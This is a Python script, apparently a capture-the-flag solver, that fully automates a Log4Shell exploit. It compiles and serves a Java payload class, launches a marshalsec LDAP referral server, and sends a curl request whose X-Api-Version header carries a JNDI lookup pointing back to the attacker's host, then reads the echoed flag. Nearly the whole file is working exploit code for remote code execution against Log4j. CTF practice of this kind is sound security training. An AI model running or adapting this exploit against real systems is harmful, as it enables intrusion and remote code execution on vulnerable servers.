from pathlib import Path
from tool.base import RunCmd, get_local_ip, match_flag, process, run_cmd
from tool.code import java_echo
from tool.http_server import HttpEcho, HttpFile


def run(url_base: str):
    ip = get_local_ip()
    if not ip:
        return False, "", "无法获取ip"

    run_cmd("mkdir -p .tmp")
    java = java_echo.replace("{{ip}}", ip).replace("{{port}}", "8000")
    with open(".tmp/Echo.java", "w", encoding="utf-8") as f:
        f.write(java)

    cr = run_cmd("javac .tmp/Echo.java")
    if not cr.ok:
        return False, "", cr.error

    with HttpFile({"Echo.class": Path(".tmp/Echo.class")}, port=8001), \
         HttpEcho(port=8000) as http_echo:

        ldap = RunCmd(f"""
            java -cp tool/marshalsec-0.0.3-SNAPSHOT-all.jar \
            marshalsec.jndi.LDAPRefServer \
            http://{ip}:8001/#Echo
        """)
        ok, err = ldap.run()
        if not ok:
            return False, "", err

        exp = f"curl -H 'X-Api-Version: ${{jndi:ldap://{ip}:1389/Echo}}' {url_base}/"
        print(exp)
        cr = run_cmd(exp)
        print(cr.output)
        if not cr.ok:
            return False, "", cr.error

        run_cmd("sleep 1")
        ldap.stop()

        text = http_echo.echo()

        flag = match_flag(text)
        if not flag:
            print(text)
            return False, "", "flag匹配失败"
        return True, flag, ""




def main(ip_port: str):
    process(ip_port, run)


if __name__ == "__main__":
    main("192.168.192.148:49974")